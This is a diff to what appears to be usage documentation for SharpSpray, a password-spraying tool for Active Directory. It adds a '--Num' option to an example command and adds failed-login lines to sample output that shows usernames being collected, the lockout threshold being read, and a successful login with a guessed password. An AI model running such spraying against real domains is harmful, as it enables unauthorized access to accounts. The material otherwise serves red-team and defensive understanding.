@@ -37,7 +37,7 @@ C:\Users\jnqpblc\Desktop>SharpSpray.exe --Seeds Password,Welcome,Company --Sleep
 [*] Using password Password19
 ^C
 
-C:\Users\jnqpblc\Desktop>SharpSpray.exe --Passwords ItsNotWinter! --Sleep 15 --Delay 300
+C:\Users\jnqpblc\Desktop>SharpSpray.exe --Passwords ItsNotWinter! --Sleep 15 --Delay 300 --Num 4
 [+] Successfully collected 42 usernames from Active Directory.
 [*] The Lockout Threshold for the current domain is 10.
 [*] The Min Password Length for the current domain is 10.
@@ -45,6 +45,9 @@ C:\Users\jnqpblc\Desktop>SharpSpray.exe --Passwords ItsNotWinter! --Sleep 15 --D
 [*] Starting password spraying operations.
 [*] Using a delay of 300 milliseonds between attempts.
 [*] Using password ItsNotWinter!
+[-] Authentication failed with test1
+[-] Authentication failed with test2
+[-] Authentication failed with test3
 [+] Successfully authenticated with jnqpblc::ItsNotWinter!
 [*] Completed all rounds with password ItsNotWinter!
 [*] Now the script will sleep for 15 minutes.
